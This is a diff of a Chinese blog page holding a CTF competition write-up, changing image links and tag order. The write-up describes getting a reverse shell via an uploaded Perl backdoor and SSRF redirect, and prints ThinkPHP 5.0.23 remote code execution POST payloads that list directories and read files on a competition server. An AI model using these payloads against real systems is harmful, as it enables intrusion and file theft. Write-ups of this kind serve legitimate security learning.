@@ -15,20 +15,20 @@
 <meta property="og:site_name" content="Knlvre">
 <meta property="og:description" content="Web总共 2 道题目 untar参考文章：记一次对ssrf的理解 源码如下 1234567891011121314151617 &amp;lt;?php    $sandbox = &quot;sandbox/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    echo $sandbox.&quot;&amp;lt;/br&amp;gt;&quot;;    @mkdir($sandbox);    @chdir($sandb">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/4-1.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/1-1.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/1-2.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/1-3.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/1-4.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/1-5.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/1-6.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/2-1.png">
-<meta property="og:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/3-1.png">
-<meta property="og:updated_time" content="2019-11-09T09:33:23.865Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/4-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/2-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/3-1.png">
+<meta property="og:updated_time" content="2019-11-09T16:02:44.584Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Knlvre">
 <meta name="twitter:description" content="Web总共 2 道题目 untar参考文章：记一次对ssrf的理解 源码如下 1234567891011121314151617 &amp;lt;?php    $sandbox = &quot;sandbox/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    echo $sandbox.&quot;&amp;lt;/br&amp;gt;&quot;;    @mkdir($sandbox);    @chdir($sandb">
-<meta name="twitter:image" content="g:/Security/Blogs/Where_put_hexo/source/img/湖湘杯复赛/4-1.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/4-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
   
@@ -179,31 +179,31 @@
 <p>由于做了重定向，所以当访问我们的 VPS 时，就等同于访问<code>listen://listen.xyz</code>，但是 listen 是未定义的模块，所以会自动搜索并加载<code>URI/listen.pm</code>（pm 是 perl 脚本的后缀），也就是我们刚在上传的后门（这里因为源码中对参数 url 做了过滤，只允许 http:// 和 https:// 协议，所以不能像参考文章那样直接在 url 参数中写 listen:// ，需要做个重定向来解决）</p>
 <p>重定向做完 + 端口监听 + 执行 payload 之后，就会收到 shell</p>
 <p>然后执行根目录下的<code>readflag</code>就能拿到 flag</p>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\4-1.png" alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/4-1.png" alt="4-1"></p>
 <h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h2><p>按照题目的提示，应该是<code>thinkphp</code>的洞。进来后要登录，先注册一个普通用户登录</p>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\1-1.png" alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-1.png" alt="1-1"></p>
 <p>然后用这个普通用户登陆进去</p>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\1-2.png" alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-2.png" alt="1-2"></p>
 <p>打算直接用一下之前刚碰到的<code>thinkphp 5.0.23</code>的<code>RCE</code>，看一下漏洞是否存在，结果直接看到版本号</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.62:19403/?s=captcha</span><br></pre></td></tr></table></figure>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\1-3.png" alt="1-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-3.png" alt="1-3"></p>
 <p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-0" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
 <p>试一下<code>scandir()</code>和<code>var_dump()</code>，扫描当前目录，直接出结果</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=.</span><br></pre></td></tr></table></figure>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\1-4.png" alt="1-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-4.png" alt="1-4"></p>
 <p>然后在<code>根目录</code>下找到<code>flag</code>字样</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../</span><br></pre></td></tr></table></figure>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\1-5.png" alt="1-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-5.png" alt="1-5"></p>
 <p>直接读取内容，拿下 flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=readfile&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../flag</span><br></pre></td></tr></table></figure>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\1-6.png" alt="1-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-6.png" alt="1-6"></p>
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>一共 2 道题目</p>
 <h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something in image"></a>something in image</h2><p>解压下来一个名为<code>badimages</code>的文件，直接拿到 fl</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings badimages | grep -i flag</span><br></pre></td></tr></table></figure>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\2-1.png" alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/2-1.png" alt="2-1"></p>
 <h2 id="EzMemory"><a href="#EzMemory" class="headerlink" title="EzMemory"></a>EzMemory</h2><p>文件有点大，但是跟上一题一样，还是直接拿下 flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mem.raw | grep -i flag&#123;</span><br></pre></td></tr></table></figure>
-<p><img src="G:\Security\Blogs\Where_put_hexo\source\img\湖湘杯复赛\3-1.png" alt="3-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/3-1.png" alt="3-1"></p>
 
       
 
@@ -404,15 +404,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
